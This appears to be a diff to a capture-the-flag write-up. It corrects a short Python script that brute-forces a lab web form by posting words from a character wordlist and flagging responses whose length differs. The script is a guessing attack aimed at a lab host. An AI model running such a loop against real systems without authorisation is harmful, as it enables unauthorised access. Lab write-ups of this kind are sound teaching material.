@@ -258,17 +258,17 @@ If it is a correct guessing, The response body will be different.
 
 import requests
 
-target = "http://members.grandline.htb" # REPLACE TARGET_IP WITH YOUR TARGET IP
+target = "http://members.grandline.htb:27777" # REPLACE TARGET_IP WITH YOUR TARGET IP
 words = open("onepieceCharacterList.txt", "r")
 
 # Config Response Body Size Here 
 previousResponseBodySize =  # You can obtain this value by using len(requests.get(target).text)
 
 for word in words:
-    r = requests.post(target, data = {'char': word, 'submit': 'submit'})
+    r = requests.post(target, data = {'char': word.strip(), 'submit': 'submit'})
     if r.status_code == 200:
-	if len(r.text) != previousResponseBodySize
-            print("/"+word.strip()+"."+extension)
+        if len(r.text) != previousResponseBodySize:
+            print(word.strip())
 
 ```
 
